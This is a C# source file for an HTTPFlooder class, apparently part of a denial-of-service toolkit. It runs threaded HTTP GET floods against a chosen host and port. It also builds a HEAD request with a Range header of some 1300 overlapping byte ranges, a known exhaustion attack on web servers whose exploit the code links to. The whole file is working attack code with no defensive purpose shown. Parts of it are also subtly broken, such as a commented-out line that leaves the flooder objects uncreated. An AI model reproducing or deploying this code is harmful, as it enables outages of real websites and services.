#region Usings
using System;
using System.Net;
using System.Text;
using System.Threading;
using GAS.Core.Tools;

#endregion

namespace GAS.Core.Attacks {
    public class HTTPFlooder : IAttacker {
        #region Shit
        private const int BUFFER_SIZE = 32;
        private readonly byte[] _buffer; //don't use for anything if you are not Nostradamus
        private IPEndPoint _riep;
        #endregion
        #region Variables
        private bool _init;
        private readonly IPAddress _ip;
        private readonly string _dns;
        private readonly string _subsite;
        private readonly bool _random;
        private readonly bool _usegZip;
        private readonly bool _ipOrDns = true;
        private readonly bool _resp;
        private readonly Thread[] _workingThreads;
        private volatile int _attacktype,
                             _spt = 1;
        private volatile string _attackHeader = "";
        #endregion
        public HTTPFlooder(
            string dns,
            string ip,
            int port = 80,
            string subSite = "/",
            bool resp = true,
            int delay = 0,
            int timeout = 5000,
            bool random = true,
            bool usegzip = true,
            int threadcount = 1,
            int attacktype = 0,
            int connectionsPerThread = 1 ) {
            this._buffer = new byte[BUFFER_SIZE];
            this.ThreadCount = threadcount;
            this._workingThreads = new Thread[this.ThreadCount];
            this.IsDelayed = false;
            try {
                this._ip = IPAddress.Parse( ip );
            }
            catch {
                try {
                    this._ip = Dns.GetHostAddresses( dns )[ 0 ];
                }
                catch {
                    this._ipOrDns = false;
                }
            }
            this._dns = dns;
            this.Port = port;
            this._subsite = subSite;
            this._resp = resp;
            this.Delay = delay;
            this.Timeout = timeout * 1000;
            this._random = random;
            this._usegZip = usegzip;
            this.States = new ReqState[this.ThreadCount];
            this._spt = connectionsPerThread;
            this._attacktype = attacktype;
        }

        public override void Start() {
            if ( this.IsFlooding )
                this.Stop();
            this.IsDelayed = false;
            this.IsFlooding = true;
            var temp = new StringBuilder( 6000 );
            for (var k = 0; k < 1300; temp.Append( ",5-" + ( k++ ) )) { }
            this._attackHeader = temp.ToString();
            this._init = false;
            for (var i = 0; i < this.ThreadCount; i++)
                ( this._workingThreads[ i ] = new Thread( this.bw_DoWork ) ).Start( i );
            this._init = true;
        }

        private void bw_DoWork( object indexinthreads ) {
            while ( !this._init ) Thread.Sleep( 100 ); //_i know it'workingSocket bad 
            this.AsyncAttack();
        }

        private void AsyncAttack() {
            this._riep = new IPEndPoint(
                this._ip,
                this.Port );
            var fs = new AsyncFlooder[this._spt];
            for (var i = 0; i < this._spt; i++) //fs[ i ] = new AsyncFlooder(this);
                fs[ i ].Start();
            Thread.Sleep( System.Threading.Timeout.Infinite );
        }

        private byte[] GetHeaderBytes() {
            if ( this._attacktype == 0 )
                return Encoding.ASCII.GetBytes(
                    String.Format(
                        this._random
                            ? String.Concat(
                                new[] {
                                    "GET {0}{1} HTTP/1.1{4}",
                                    "Host: {2}{4}",
                                    "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){4}",
                                    "{3}{4}"
                                } )
                            : String.Concat(
                                new[] {
                                    "GET {0} HTTP/1.1{4}",
                                    "Host: {2}{4}",
                                    "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){4}",
                                    "{3}{4}",
                                    "{4}"
                                } ),
                        this._subsite,
                        Misc.RS(),
                        this._dns,
                        ( ( this._usegZip ) ? ( "Accept-Encoding: gzip,deflate" + Environment.NewLine ) : "" ),
                        "\r\n" ) );
            //http://1337day.com/exploits/16729
            return Encoding.ASCII.GetBytes(
                String.Format(
                    String.Concat(
                        new[] {
                            "HEAD {0}{1} HTTP/1.1{4}",
                            "Accept: */*{4}",
                            "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}",
                            "{3}Host: {2}{4}" + "Range:bytes=0-{5}{4}",
                            "Connection: close{4}",
                            "{4}"
                        } ),
                    this._subsite,
                    ( this._random ? Misc.RS() : null ),
                    this._dns,
                    ( this._usegZip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : null ),
                    Environment.NewLine,
                    this._attackHeader ) );
        }

        public override void Stop() {
            this.IsFlooding = false;
            try {
                foreach (var x in this._workingThreads)
                    try {
                        x.Abort();
                    }
                    catch {}
            }
            catch {}
        }
    }
}